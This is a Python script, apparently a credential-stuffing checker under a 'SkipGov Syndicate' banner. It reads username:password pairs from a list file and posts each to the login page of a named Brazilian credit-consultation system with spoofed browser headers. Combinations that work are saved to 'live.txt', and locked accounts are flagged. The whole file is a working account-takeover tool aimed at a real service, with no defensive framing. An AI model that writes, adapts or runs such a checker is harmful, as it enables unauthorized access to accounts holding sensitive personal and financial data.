import requests
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import os

# Inicializa o colorama
init(autoreset=True)

def exibir_banner():
    branco = "\033[37m"  # Cor branca
    resetar_cor = "\033[0m"

    # Exibir banner customizado
    banner = """
    serasa - SkipGov Syndicate
    """
    print(f"{branco}{banner}{resetar_cor}")
    print(f"{branco}(ティマオ |ミゲル){resetar_cor}")

# Chama a função para exibir o banner
exibir_banner()

# Função que testa o login
def test_login(username, password):
    url = "https://sistema.consultcenter.com.br/users/login"
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control": "max-age=0",
        "content-type": "application/x-www-form-urlencoded",
        "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": "\"Android\"",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-site",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1"
    }
    data = {
        "data[UsuarioLogin][username]": username,
        "data[UsuarioLogin][password]": password,
        "signin": ""
    }

    try:
        response = requests.post(url, headers=headers, data=data, cookies=None)
        response_text = response.text.strip()

        if '<strong>Bem Vindo!</strong>' in response_text:
            print(f"{Fore.GREEN}{Style.BRIGHT}Válido{Style.RESET_ALL} | {username}:{password} - Login realizado com sucesso")
            with open("live.txt", "a") as live_file:
                live_file.write(f"{username}:{password}\n")
        elif 'Usuário e senha incorretos' in response_text:
            print(f"{Fore.WHITE}{Style.BRIGHT}Inválido{Style.RESET_ALL} | {username}:{password} - Login inválido")
        if 'Usuário bloqueado para acesso' in response_text:
            print(f"{Fore.MAGENTA}Usuário bloqueado para acesso{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}Erro ao tentar login | {username}:{password} - Motivo: {str(e)}{Style.RESET_ALL}")

# Função principal
def main():
    if not os.path.isfile('lista.txt'):
        print(f"{Fore.RED}Erro: O arquivo 'lista.txt' não foi encontrado.{Style.RESET_ALL}")
        return

    with open('lista.txt', 'r') as file:
        login_data = file.readlines()

    for line in login_data:
        line = line.strip()
        if ':' in line:
            parts = line.split(":")
            if len(parts) == 2:
                username, password = parts
                test_login(username.strip(), password.strip())

if __name__ == '__main__':
    main()